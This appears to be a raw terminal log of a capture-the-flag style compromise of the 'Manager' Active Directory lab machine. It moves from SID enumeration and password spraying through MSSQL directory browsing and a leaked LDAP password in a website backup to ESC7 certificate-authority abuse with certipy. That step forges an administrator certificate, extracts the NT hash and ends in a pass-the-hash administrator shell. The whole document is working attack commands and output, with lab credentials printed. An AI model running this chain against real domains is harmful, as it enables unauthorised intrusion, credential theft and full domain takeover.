@@ -1,0 +1,392 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-lookupsid anonymous@manager.htb -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Brute forcing SIDs at manager.htb
+[*] StringBinding ncacn_np:manager.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
+498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: MANAGER\Administrator (SidTypeUser)
+501: MANAGER\Guest (SidTypeUser)
+502: MANAGER\krbtgt (SidTypeUser)
+512: MANAGER\Domain Admins (SidTypeGroup)
+513: MANAGER\Domain Users (SidTypeGroup)
+514: MANAGER\Domain Guests (SidTypeGroup)
+515: MANAGER\Domain Computers (SidTypeGroup)
+516: MANAGER\Domain Controllers (SidTypeGroup)
+517: MANAGER\Cert Publishers (SidTypeAlias)
+518: MANAGER\Schema Admins (SidTypeGroup)
+519: MANAGER\Enterprise Admins (SidTypeGroup)
+520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
+521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
+522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
+525: MANAGER\Protected Users (SidTypeGroup)
+526: MANAGER\Key Admins (SidTypeGroup)
+527: MANAGER\Enterprise Key Admins (SidTypeGroup)
+553: MANAGER\RAS and IAS Servers (SidTypeAlias)
+571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
+572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
+1000: MANAGER\DC01$ (SidTypeUser)
+1101: MANAGER\DnsAdmins (SidTypeAlias)
+1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
+1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+1113: MANAGER\Zhong (SidTypeUser)
+1114: MANAGER\Cheng (SidTypeUser)
+1115: MANAGER\Ryan (SidTypeUser)
+1116: MANAGER\Raven (SidTypeUser)
+1117: MANAGER\JinWoo (SidTypeUser)
+1118: MANAGER\ChinHae (SidTypeUser)
+1119: MANAGER\Operator (SidTypeUser)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-lookupsid anonymous@manager.htb -no-pass | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}' > users
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat users         
+Administrator
+Guest
+krbtgt
+DC01$
+Zhong
+Cheng
+Ryan
+Raven
+JinWoo
+ChinHae
+Operator
+                                                                                                                     
+for a while had a problem, had to convert to lowercase.
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb 10.10.11.236 -u users -p users
+SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [-] manager.htb\Administrator:Administrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.236    445    DC01             [-] manager.htb\Guest:Administrator STATUS_LOGON_FAILURE 
+...
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (MANAGER\Operator  guest@master)> xp_dirtree \
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+
+Documents and Settings          1      0   
+
+inetpub                         1      0   
+
+PerfLogs                        1      0   
+
+Program Files                   1      0   
+
+Program Files (x86)             1      0   
+
+ProgramData                     1      0   
+
+Recovery                        1      0   
+
+SQL2019                         1      0   
+
+System Volume Information       1      0   
+
+Temp                            1      0   
+
+Users                           1      0   
+
+Windows                         1      0   
+
+SQL (MANAGER\Operator  guest@master)> xp_dirtree \inetpub
+subdirectory   depth   file   
+------------   -----   ----   
+custerr            1      0   
+
+history            1      0   
+
+logs               1      0   
+
+temp               1      0   
+
+wwwroot            1      0   
+
+SQL (MANAGER\Operator  guest@master)> xp_dirtree \inetpub\wwwroot
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1   
+
+contact.html                          1      1   
+
+css                                   1      0   
+
+images                                1      0   
+
+index.html                            1      1   
+
+js                                    1      0   
+
+service.html                          1      1   
+
+web.config                            1      1   
+
+website-backup-27-07-23-old.zip       1      1   
+
+SQL (MANAGER\Operator  guest@master)> 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wget http://10.10.11.236/website-backup-27-07-23-old.zip
+--2025-09-03 02:12:21--  http://10.10.11.236/website-backup-27-07-23-old.zip
+Connecting to 10.10.11.236:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1045328 (1021K) [application/x-zip-compressed]
+Saving to: ‘website-backup-27-07-23-old.zip’
+
+website-backup-27-07-23-old.z 100%[==============================================>]   1021K  2.41MB/s    in 0.4s    
+
+2025-09-03 02:12:21 (2.41 MB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# unzip website-backup-27-07-23-old.zip 
+Archive:  website-backup-27-07-23-old.zip
+  inflating: .old-conf.xml           
+  inflating: about.html              
+  inflating: contact.html            
+  inflating: css/bootstrap.css       
+  inflating: css/responsive.css      
+  inflating: css/style.css           
+  inflating: css/style.css.map       
+  inflating: css/style.scss          
+  inflating: images/about-img.png    
+  inflating: images/body_bg.jpg      
+ extracting: images/call.png         
+ extracting: images/call-o.png       
+  inflating: images/client.jpg       
+  inflating: images/contact-img.jpg  
+ extracting: images/envelope.png     
+ extracting: images/envelope-o.png   
+  inflating: images/hero-bg.jpg      
+ extracting: images/location.png     
+ extracting: images/location-o.png   
+ extracting: images/logo.png         
+  inflating: images/menu.png         
+ extracting: images/next.png         
+ extracting: images/next-white.png   
+  inflating: images/offer-img.jpg    
+  inflating: images/prev.png         
+ extracting: images/prev-white.png   
+ extracting: images/quote.png        
+ extracting: images/s-1.png          
+ extracting: images/s-2.png          
+ extracting: images/s-3.png          
+ extracting: images/s-4.png          
+ extracting: images/search-icon.png  
+replace index.html? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
+  inflating: index.html              
+  inflating: js/bootstrap.js         
+  inflating: js/jquery-3.4.1.min.js  
+  inflating: service.html            
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat .old-conf.xml                             
+<?xml version="1.0" encoding="UTF-8"?>
+<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+   <server>
+      <host>dc01.manager.htb</host>
+      <open-port enabled="true">389</open-port>
+      <secure-port enabled="false">0</secure-port>
+      <search-base>dc=manager,dc=htb</search-base>
+      <server-type>microsoft</server-type>
+      <access-user>
+         <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+      </access-user>
+      <uid-attribute>cn</uid-attribute>
+   </server>
+   <search type="full">
+      <dir-list>
+         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+      </dir-list>
+   </search>
+</ldap-conf>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
+[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
+[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : manager-DC01-CA
+    DNS Name                            : dc01.manager.htb
+    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
+    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : MANAGER.HTB\Administrators
+      Access Rights
+        Enroll                          : MANAGER.HTB\Operator
+                                          MANAGER.HTB\Authenticated Users
+                                          MANAGER.HTB\Raven
+        ManageCa                        : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+                                          MANAGER.HTB\Raven
+        ManageCertificates              : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : MANAGER.HTB\Raven
+                                          MANAGER.HTB\Authenticated Users
+    [+] User ACL Principals             : MANAGER.HTB\Raven
+    [!] Vulnerabilities
+      ESC7                              : User has dangerous permissions.
+Certificate Templates                   : [!] Could not find any certificate templates
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully added officer 'Raven' on 'manager-dc01-ca'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully enabled 'SubCA' on 'manager-dc01-ca'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 23
+[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+Would you like to save the private key? (y/N): y
+[*] Saving private key to '23.key'
+[*] Wrote private key to '23.key'
+[-] Failed to request certificate
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 23                              
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully issued certificate request ID 23
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 23                                  
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Retrieving certificate with ID 23
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '23.key'
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# openssl pkcs12 -export -out administrator.pfx -inkey 23.key -in administrator.crt -passout pass:
+No cert in -in file 'administrator.crt' matches private key
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@manager.htb'
+[*] Using principal: 'administrator@manager.htb'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ntpdate 10.10.11.236                      
+2025-09-03 12:24:56.813750 (-0400) +25201.072697 +/- 0.018099 10.10.11.236 s1 no-leap
+CLOCK: time stepped by 25201.072697
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@manager.htb'
+[*] Using principal: 'administrator@manager.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+manager\administrator
+
+
+
+
+
+
+
+
+
+
